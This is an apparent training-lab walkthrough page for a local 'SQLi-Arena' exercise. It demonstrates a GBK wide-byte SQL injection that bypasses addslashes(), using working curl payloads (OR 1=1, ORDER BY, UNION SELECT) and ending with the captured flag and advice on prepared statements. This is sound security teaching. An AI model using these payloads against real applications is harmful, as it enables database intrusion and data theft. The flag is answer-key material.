<h4>Step 1: Normal Lookup</h4>
<p>
    Search for <code>admin</code> to confirm the page works normally.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab20" -d "username=admin"<br><br>
        <span class="prompt">Input: </span>admin<br><br>
        <span class="prompt">Query: </span>SELECT username, email FROM users WHERE username = 'admin'<br><br>
        <span class="prompt">Result: </span>Username: admin | Email: admin@corp.local
    </div>
</div>

<h4>Step 2: Observe addslashes() Escaping</h4>
<p>
    Try <code>admin'</code>: notice that <code>addslashes()</code> escapes the quote
    with a backslash, preventing injection.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2: addslashes() in Action</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab20" -d "username=admin%27"<br><br>
        <span class="prompt">Input: </span>admin'<br>
        <span class="prompt">After addslashes: </span>admin\'<br>
        <span class="prompt">Raw bytes (input): </span>0x61 0x64 0x6D 0x69 0x6E 0x27<br>
        <span class="prompt">Raw bytes (escaped): </span>0x61 0x64 0x6D 0x69 0x6E 0x5C 0x27<br><br>
        <span class="prompt">Query: </span>SELECT username, email FROM users WHERE username = 'admin\''<br><br>
        <span class="prompt">Result: </span>No results found (the escaped quote doesn't break the query)<br><br>
        <span class="prompt">Analysis: </span>addslashes() adds a backslash (0x5C) before the quote (0x27). The query remains intact.
    </div>
</div>

<h4>Step 3: Understand the GBK Wide-Byte Attack</h4>
<p>
    The key insight: the database connection uses <strong>GBK charset</strong>. In GBK, certain
    two-byte sequences form valid characters. The byte <code>0x5C</code> (backslash) can be
    &ldquo;consumed&rdquo; as the second byte of a GBK character.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. GBK Wide-Byte Concept</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Attack byte: </span>0xBF (sent before the quote)<br><br>
        <span class="prompt">Input bytes: </span>0xBF 0x27 (0xBF + single quote)<br>
        <span class="prompt">addslashes: </span>0xBF 0x5C 0x27 (backslash inserted before quote)<br>
        <span class="prompt">MySQL GBK: </span>[0xBF5C] 0x27 (0xBF5C = valid GBK character)<br><br>
        <span class="prompt">Result: </span>MySQL interprets 0xBF5C as a single GBK character.<br>
        &nbsp;&nbsp;The quote 0x27 is now UNESCAPED and breaks out of the string!
    </div>
</div>

<h4>Step 4: Test the Wide-Byte Injection with curl</h4>
<p>
    Use <code>curl</code> to send the raw <code>%bf</code> byte. This is more reliable than
    the browser form for sending arbitrary bytes.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Test Wide-Byte with curl</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab20" -d "username=%bf%27+OR+1%3D1+--+-"<br><br>
        <span class="prompt">Bytes sent: </span>0xBF 0x27 0x20 0x4F 0x52 0x20 0x31 0x3D 0x31 0x20 0x2D 0x2D 0x20 0x2D<br>
        <span class="prompt">addslashes: </span>0xBF 0x5C 0x27 0x20 0x4F 0x52 0x20 0x31 0x3D 0x31 0x20 0x2D 0x2D 0x20 0x2D<br>
        <span class="prompt">MySQL sees: </span>[GBK_char: 0xBF5C]' OR 1=1 -- -<br><br>
        <span class="prompt">Query: </span>SELECT username, email FROM users WHERE username = '[GBK_char]' OR 1=1 -- -'<br><br>
        <span class="prompt">Result: </span>All 5 users returned (admin, alice, bob, charlie, dave)! The injection works.
    </div>
</div>

<h4>Step 5: Determine Column Count</h4>
<p>
    The query returns 2 columns (<code>username, email</code>). Confirm with ORDER BY.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Column Count</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab20" -d "username=%bf%27+ORDER+BY+2+--+-"<br>
        <span class="prompt">Result: </span>No error &rarr; 2 or more columns<br><br>
        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab20" -d "username=%bf%27+ORDER+BY+3+--+-"<br>
        <span class="prompt">Result: </span>Unknown column '3' in 'ORDER BY' &rarr; Query has <strong>2 columns</strong>
    </div>
</div>

<h4>Step 6: UNION SELECT to Extract the Secret</h4>
<p>
    Use UNION SELECT with 2 columns to extract the secret from <code>secret_data</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Extract the Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab20" -d "username=%bf%27+UNION+SELECT+secret%2C2+FROM+secret_data+--+-"<br><br>
        <span class="prompt">Bytes sent: </span>0xBF 0x27 0x20 0x55 0x4E 0x49 0x4F 0x4E 0x20 0x53 0x45 0x4C 0x45 0x43 0x54 ...<br>
        <span class="prompt">addslashes: </span>0xBF 0x5C 0x27 ... (backslash at 0x5C consumed by GBK as part of 0xBF5C)<br><br>
        <span class="prompt">Query: </span>SELECT username, email FROM users WHERE username = '[GBK:0xBF5C]' UNION SELECT secret,2 FROM secret_data -- -'<br><br>
        <span class="prompt">Result: </span><br>
        &nbsp;&nbsp;Username: <strong>FLAG{w1d3_byt3_gbk_3sc4p3}</strong> | Email: 2
    </div>
</div>

<h4>Step 7: Using the Browser Form</h4>
<p>
    You can also try entering <code>%bf'</code> directly in the browser form. Some browsers
    may URL-encode the <code>%bf</code> differently, so curl is more reliable. If using the
    form, try pasting: <code>&#xbf;' UNION SELECT secret, 2 FROM secret_data -- -</code>
    (where the first character is the raw byte 0xBF).
</p>

<h4>Step 8: Python Automation Script</h4>
<p>
    The wide-byte injection requires sending raw bytes, which is tricky in browsers.
    This Python script handles it with multiple methods (URL-encoded, raw bytes, error-based):
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Python Automation (lab20_gbk_widebyte.py)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 scripts/lab20_gbk_widebyte.py http://localhost/SQLi-Arena/<br><br>
        <span class="prompt">[*] </span>Attack: GBK wide-byte to bypass addslashes()<br>
        <span class="prompt">[*] </span>How it works:<br>
        <span class="prompt">&nbsp;&nbsp;</span>Input:       0xBF 0x27           (0xBF + single quote)<br>
        <span class="prompt">&nbsp;&nbsp;</span>addslashes:  0xBF 0x5C 0x27      (backslash added before quote)<br>
        <span class="prompt">&nbsp;&nbsp;</span>GBK decode:  [0xBF5C] 0x27       (0xBF5C = valid GBK character)<br>
        <span class="prompt">&nbsp;&nbsp;</span>Result:      &lt;GBK_char&gt; '         (quote is now UNESCAPED!)<br><br>
        <span class="prompt">[*] </span>Method 1: URL-encoded wide-byte payload<br>
        <span class="prompt">[+] </span>Flag: FLAG{w1d3_byt3_gbk_3sc4p3}
    </div>
</div>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Script Source: lab20_gbk_widebyte.py</span>
    </div>
    <div class="terminal-body"><pre style="margin:0;white-space:pre;overflow-x:auto;"><?php echo htmlspecialchars(file_get_contents(__DIR__ . '/scripts/lab20_gbk_widebyte.py')); ?></pre></div>
</div>

<h4>Step 9: Submit the Secret</h4>
<p>
    Copy the flag from the results and paste it into the verification form:
    <code>FLAG{w1d3_byt3_gbk_3sc4p3}</code>.
</p>

<h4>Step 10: Why This Happens and How to Prevent It</h4>
<p>
    The root cause is using <code>addslashes()</code> instead of charset-aware escaping.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 9. Defense and Prevention</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Problem: </span>addslashes() is NOT charset-aware. It blindly adds 0x5C before 0x27.<br>
        &nbsp;&nbsp;In multi-byte charsets (GBK, BIG5, SJIS), this 0x5C can be absorbed.<br><br>
        <span class="prompt">Defense 1: </span>Use mysqli_real_escape_string() -- it is charset-aware<br>
        &nbsp;&nbsp;and knows not to create exploitable multi-byte sequences.<br><br>
        <span class="prompt">Defense 2: </span>Use prepared statements (parameterized queries) -- the best defense.<br>
        &nbsp;&nbsp;Data is never mixed with SQL structure.<br><br>
        <span class="prompt">Defense 3: </span>Use UTF-8 charset exclusively. UTF-8 does not have this vulnerability<br>
        &nbsp;&nbsp;because 0x5C is never a valid continuation byte.<br><br>
        <span class="prompt">Vulnerable charsets: </span>GBK, BIG5, SJIS, CP932, GB2312 -- any charset where<br>
        &nbsp;&nbsp;0x5C can appear as the second byte of a multi-byte character.
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Never use <code>addslashes()</code> for SQL escaping. It is not
    charset-aware and can be bypassed with multi-byte character encodings like GBK. Always use
    <strong>prepared statements</strong> or at minimum <code>mysqli_real_escape_string()</code>
    (which is charset-aware). Better yet, use <strong>UTF-8</strong> exclusively and avoid legacy
    multi-byte charsets that have wide-byte vulnerabilities.
</div>
